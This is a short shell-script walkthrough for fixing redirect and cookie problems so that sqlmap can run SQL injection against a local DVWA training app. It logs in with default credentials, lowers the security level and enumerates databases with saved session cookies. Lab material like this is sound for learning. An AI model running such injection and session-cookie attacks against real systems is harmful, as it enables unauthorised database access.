# Fixing 302 redirect and cookie issues with DVWA + sqlmap
# (ready to copy & paste into terminal)

# 1️⃣  Go to your working directory (e.g. /root)
cd ~

# 2️⃣  Make sure Apache and MariaDB are running
sudo systemctl start apache2
sudo systemctl start mariadb

# 3️⃣  Log in to DVWA from terminal and save session cookies
curl -s -c cookies.txt -d "username=admin&password=password&Login=Login" \
    "http://127.0.0.1/dvwa/login.php" > /dev/null

# 4️⃣  Set DVWA security level to low directly from terminal
curl -s -b cookies.txt -d "security=low&seclev_submit=Submit" \
    "http://127.0.0.1/dvwa/security.php" > /dev/null

# 5️⃣  Double‑check cookies.txt shows security low and a valid PHPSESSID
grep -i security cookies.txt
grep -i PHPSESSID cookies.txt

# 6️⃣  Test the vulnerable URL quickly
curl -s -I -b cookies.txt \
    "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,8p'

# 7️⃣  Run sqlmap using saved cookies
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "$(grep PHPSESSID cookies.txt | awk '{print $7"="$8}')" \
   --batch --level=3 --risk=2 --dbs | tee sqlmap-dbs.txt

# The --cookie argument sends the correct PHP session and security level to sqlmap.
# sqlmap will now enumerate the databases and write output to sqlmap-dbs.txt.

# ✅  If you still hit redirects:
#   - Ensure you are logged into DVWA in your browser at least once.
#   - Clear old cookies.txt and repeat steps 3 and 4.
#   - Confirm DVWA config allows SQL Injection (Database reset if needed).
